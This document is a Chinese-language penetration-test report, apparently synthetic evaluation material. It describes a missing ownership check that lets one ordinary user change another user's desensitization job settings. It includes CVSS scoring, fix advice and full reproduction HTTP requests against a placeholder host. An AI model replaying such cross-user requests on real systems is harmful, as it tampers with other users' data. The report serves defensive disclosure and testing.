# 示例系统-智能脱敏 作业归属校验缺失：普通用户可修改其他用户的脱敏设置

CVSS 4.0：CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N  评分 2.3（低危）

测试时间：2026年11月1日 10:00（北京时间）。

## 描述
用户 A 的脱敏作业等待选择类型时，另一普通用户 B 使用自己的身份提交该作业编号并选择 `name`。A 随后查询，发现类型从空变为 `name`，状态从 `WAITING` 变为 `SUCCESS`，并出现正式文件可用标记。测试没有下载文件，是否造成漏脱敏未验证；条件是攻击者已登录并知道作业编号。

### 定级依据

普通用户可修改另一用户的作业设置，支持已观察到的完整性影响；文件内容是否被错误脱敏未验证。

## 修复
服务端修改作业前校验当前用户是否为创建者或已授权协作者；无权访问时拒绝请求并保留原状态。登录检查不能代替作业归属校验。正式文件内容及其他接口未验证，不能据此断言已发生漏脱敏。

## 测试过程

### 发现过程与攻击思路
用户 A 先查询自己的作业作为基线。用户 B 用自己的身份提交修改请求。A 再查询，确认设置和状态发生变化。未提供身份时，同一修改请求返回 401。其他状态作业和批量编号未测试。

Burp Repeater：实际测试使用离线合成报文，Burp 复测未验证。复测时取得两个普通账号各自的会话；先用 A 查询作业，再由 B 修改请求中的作业编号，最后由 A 重新查询。以 A 读到 B 设置的类型及状态变化作为结果。文末列有修改前查询、修改请求和修改后查询的完整报文。

### 失败尝试与未验证项

不带身份的修改请求返回 401。其他作业状态、批量编号和文件内容未测试。

## 攻击链路
```text
用户 A 的脱敏作业等待选择类型
└─ 用户 B 使用自己的账号提交该作业编号
   └─ POST /api/jobs/job-a/types
      └─ 用户 A 查询到设置和状态已改变
```


## 证据说明

以下报文为离线合成材料。用户和作业编号不能用于真实系统；完整包按用途列在文末。

### Burp 复现

实际测试使用离线合成报文，Burp Repeater 复测未验证。重放时先以用户 A 查询作业，再以用户 B 修改请求中的作业编号，最后由 A 查询并比较设置和状态。

### 复测标准

修复后用户 B 修改用户 A 的作业应被拒绝，A 的设置与状态保持不变；A 修改自己的作业仍应成功。

### 完整请求与响应

#### 修改前查询

请求：

```http
GET /api/jobs/job-a HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 92

{"id":"job-a","owner":"user-a","selectedTypes":[],"state":"WAITING","formalAvailable":false}
```

#### 其他用户提交修改

请求：

```http
POST /api/jobs/job-a/types HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-b
Content-Type: application/json
Content-Length: 26

{"selectedTypes":["name"]}
```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 11

{"ok":true}
```

#### 修改后查询

请求：

```http
GET /api/jobs/job-a HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 97

{"id":"job-a","owner":"user-a","selectedTypes":["name"],"state":"SUCCESS","formalAvailable":true}
```

#### 不带身份提交修改

请求：

```http
POST /api/jobs/job-a/types HTTP/1.1
Host: report-eval.invalid
Content-Type: application/json
Content-Length: 26

{"selectedTypes":["name"]}
```

响应：

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Content-Length: 35

{"error":"authentication_required"}
```
